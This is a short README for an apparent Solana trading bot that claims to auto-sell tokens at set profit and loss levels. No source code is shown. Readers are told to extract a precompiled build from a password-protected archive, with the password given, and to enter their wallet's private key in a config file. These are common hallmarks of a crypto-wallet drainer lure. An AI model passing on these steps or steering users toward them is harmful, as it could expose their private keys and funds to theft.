### Problem

In most cases, after purchasing tokens on the Solana network, traders often miss the opportunity to take profit, leading to the token rug-pulling or being dumped. This software aims to address this issue by analyzing token prices and automatically selling when they reach certain profit levels (30-40-100%) or cut losses when the price drops (10-20%).
By using this tool, traders may secure stable profits, albeit potentially less than maximum possible gains.

### Resources Used

- Developed on .NET 7.0
- Utilizes SolNet for wallet interaction
- Relies on Shyft.to as RPC
- Custom Raydium SDK for token swaps

### Pre-installation Steps

- Obtain a Shyft [RPC API key](https://shyft.to/get-api-key)
- Download .NET 7.0 runtime if not already installed
- Have your Solana wallet address with the tokens you intend to trade and its private key ready

### Installation

1. Download the latest compiled build and extract it to a folder with pass `VcHe73Jq`.
2. Edit the configuration provided below.
3. Run the bot.

### Configuration

```json
[
  {
    "sol_rpc": "<your-shyft-to-rpc>",
    "private_key": "<your-solana-private-key>"
  }
]
```

### Disclaimer

Do not use your main wallets with this software. This tool is intended for educational purposes only. Use it at your own risk and discretion.
